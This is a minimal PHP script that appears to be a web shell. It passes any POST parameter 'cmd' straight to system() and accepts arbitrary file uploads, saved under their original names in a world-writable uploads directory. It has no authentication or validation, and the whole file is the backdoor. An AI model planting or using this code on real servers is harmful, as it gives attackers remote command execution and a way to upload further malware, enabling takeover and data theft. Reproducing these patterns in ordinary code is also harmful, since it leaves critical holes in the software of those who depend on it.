<?php
    if(isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        system($cmd);
    }
    if(isset($_FILES['file'])) {
        $uploaddir = './uploads/';
        if (!file_exists($uploaddir)) {
            mkdir($uploaddir, 0777, true);
        }
        $uploadfile = $uploaddir . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
            echo "File uploaded successfully to $uploadfile";
        } else {
            echo "Upload failed!";
        }
    }
?>